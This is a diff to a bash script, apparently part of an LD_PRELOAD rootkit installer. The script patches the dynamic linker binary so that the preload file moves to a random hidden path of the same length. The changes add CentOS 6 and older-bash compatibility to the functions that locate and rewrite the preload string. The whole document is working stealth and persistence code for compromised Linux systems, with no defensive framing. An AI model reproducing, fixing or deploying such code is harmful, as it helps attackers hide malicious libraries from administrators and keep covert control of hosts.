@@ -27,17 +27,21 @@ find_preload_location()
     local strings_output lib
     [ -z ${LD_LIBS[0]} ] && get_ld_libs
     lib=${LD_LIBS[0]}
-    strings_output="$(strings -d $lib | grep '/' | tail -n 1)"
+    strings_cmd="strings -d"
+    if grep -Eqi "CentOS release 6" /etc/issue || grep -Eq "CentOS release 6" /etc/*-release; then
+        strings_cmd="strings"
+    fi
+    strings_output="$($strings_cmd $lib | grep '/' | tail -n 1)"
     echo -n $strings_output
 }
 
 # builds new location string for the preload file.
 get_new_preload(){ echo -n "`$script_root/get_rand_path.sh 2`.`random 'A-Za-z0-9' 8`"; }
-hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::-2}00" | awk '{print toupper($0)}'; }
+hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::${#HS}-2}00" | awk '{print toupper($0)}'; }
 
 patch_lib() # $1=target lib, $2=old preload file, $3=new preload file
 {
-    [[ "`strings $1`" != *"$2"* ]] && return
+    [[ "`strings -a $1`" != *"$2"* ]] && return
     [ $2 == $3 ] && { necho "Skipping $1 (nothing to change)"; return; }
 
     local ho_preload hn_preload
@@ -61,7 +65,7 @@ patch_dynamic_linker() # $1=old preload file
         new_preload="`get_new_preload`" # generate new preload file location
 
         # the new file location has got to be the same length as the previous
-        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::-1}; done
+        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
         while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done
     done
 
